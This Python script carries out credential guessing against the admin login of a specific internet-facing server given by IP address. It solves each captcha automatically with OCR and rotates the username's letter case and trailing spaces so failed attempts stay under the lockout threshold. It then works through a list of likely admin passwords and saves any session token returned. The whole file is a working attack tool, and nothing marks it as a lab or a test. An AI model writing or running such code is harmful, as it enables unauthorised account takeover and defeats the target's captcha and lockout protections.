#!/usr/bin/env python3
"""i28909: controlled login attempts, rotating username case/space variants (lock bypass),
one fresh captcha + ddddocr solve per login, low freq, stop on token.

usage: run.py <start> <count> [gap]
"""
import urllib.request, urllib.error, json, base64, re, sys, time, os
import ddddocr

BASE = 'http://144.123.22.234:9080/prod-api'
CLIENT_ID = '7882175c171521a945ee6bdd5580377f'
beta = ddddocr.DdddOcr(beta=True, show_ad=False)
std = ddddocr.DdddOcr(show_ad=False)

LOG = open('attempt.log', 'a', encoding='utf-8')
def log(*a):
    s = ' '.join(str(x) for x in a)
    print(s, flush=True)
    LOG.write(s + '\n'); LOG.flush()

def parse(t):
    t = (t.replace('×', '*').replace('✕', '*').replace('x', '*').replace('X', '*')
          .replace('＋', '+').replace('一', '-').replace('—', '-').replace('=', '=').strip('='))
    m = re.search(r'(\d)\s*([+\-*])\s*(\d)', t)
    if not m:
        return None
    a, op, c = int(m.group(1)), m.group(2), int(m.group(3))
    return {'+': a + c, '-': a - c, '*': a * c}[op], '%d%s%d' % (a, op, c)

def get_code(tries=8):
    for i in range(tries):
        try:
            t = urllib.request.urlopen(BASE + '/auth/code', timeout=20).read().decode()
        except Exception as e:
            log('CODE_ERR', repr(e)); time.sleep(8); continue
        try:
            d = json.loads(t)
        except Exception:
            log('CODE_BAD', t[:150]); time.sleep(8); continue
        if d.get('code') != 200 or not d.get('data'):
            log('CODE_RATELIMIT', str(t)[:150]); time.sleep(10); continue
        data = d['data']; uuid = data['uuid']; img = base64.b64decode(data['img'])
        open('last_code.png', 'wb').write(img)
        tb = beta.classification(img); ts = std.classification(img)
        p = parse(tb) or parse(ts)
        if not p:
            log('OCR_FAIL beta=%r std=%r' % (tb, ts)); time.sleep(4); continue
        return uuid, str(p[0]), p[1], tb, ts
    return None

def post_login(body):
    h = {'Content-Type': 'application/json;charset=utf-8', 'clientid': CLIENT_ID}
    raw = json.dumps(body, ensure_ascii=False).encode('utf-8')
    req = urllib.request.Request(BASE + '/auth/login', data=raw, headers=h)
    try:
        r = urllib.request.urlopen(req, timeout=20)
        return r.status, r.read().decode(), raw
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(), raw

# prior usage seen in i28896/probe.log (per raw-username counter)
PRIOR = {'admin': 4, 'Admin': 2, 'ADMIN': 1, 'adMin': 1, 'admin ': 1}

CANDIDATES = ['Admin@123', 'admin@123', 'Admin123', 'admin1234', 'Admin@2024', 'Jydsj@2024',
              'jydsj@2024', 'jydsj123', 'daka@2024', 'pl@123456', 'pl123456', 'Admin888']
# untouched-ish variants (avoid lowercase 'admin': 4/5 used)
VARIANTS = ['Admin ', 'ADMIN ', 'adMin ', 'admIn', 'ADmin', 'aDmin ', 'Admin', 'adMin']

def build_plan():
    plan = []
    used = {v: PRIOR.get(v, 0) for v in VARIANTS}
    for cand in CANDIDATES:
        # two variants per candidate, chosen by least-used budget (cap 4 to never trigger lock)
        for _ in range(2):
            ok = [v for v in VARIANTS if used[v] < 4]
            if not ok:
                return plan
            v = min(ok, key=lambda x: (used[x], VARIANTS.index(x)))
            used[v] += 1
            plan.append({'variant': v, 'password': cand})
    return plan

def main():
    start = int(sys.argv[1]) if len(sys.argv) > 1 else 0
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 12
    gap = float(sys.argv[3]) if len(sys.argv) > 3 else 4.0
    plan = build_plan()
    log('PLAN n=%d %s' % (len(plan), json.dumps(plan, ensure_ascii=False)))
    last = 0.0
    for i, item in enumerate(plan[start:start + count], start=start):
        dt = time.time() - last
        if dt < gap:
            time.sleep(gap - dt)
        user, pw = item['variant'], item['password']
        rc = get_code()
        if not rc:
            log('SKIP idx=%d %r/%r no captcha' % (i, user, pw)); continue
        uuid, ans, expr, tb, ts = rc
        body = {"tenantId": "000000", "username": user, "password": pw, "code": ans,
                "uuid": uuid, "clientId": CLIENT_ID, "grantType": "password"}
        st, txt, raw = post_login(body)
        last = time.time()
        rec = {'idx': i, 'username': user, 'password': pw, 'req': body,
               'ocr': {'beta': tb, 'std': ts, 'expr': expr}, 'status': st, 'resp': txt}
        open('att_%02d_%s.json' % (i, re.sub(r'\W', '_', user)), 'w', encoding='utf-8').write(
            json.dumps(rec, ensure_ascii=False, indent=1))
        log('ATT %02d user=%r pw=%r ocr=(%r|%r) expr=%s -> %s %s' % (i, user, pw, tb, ts, expr, st, txt[:300]))
        low = txt.lower()
        if ('"code":200' in txt) or ('token' in low and 'code":500' not in txt):
            open('SUCCESS.json', 'w', encoding='utf-8').write(json.dumps(rec, ensure_ascii=False, indent=1))
            open('token_resp.txt', 'w').write(txt)
            log('SUCCESS user=%r pw=%r resp=%s' % (user, pw, txt[:800]))
            return
    log('BATCH END start=%d count=%d' % (start, count))

if __name__ == '__main__':
    main()
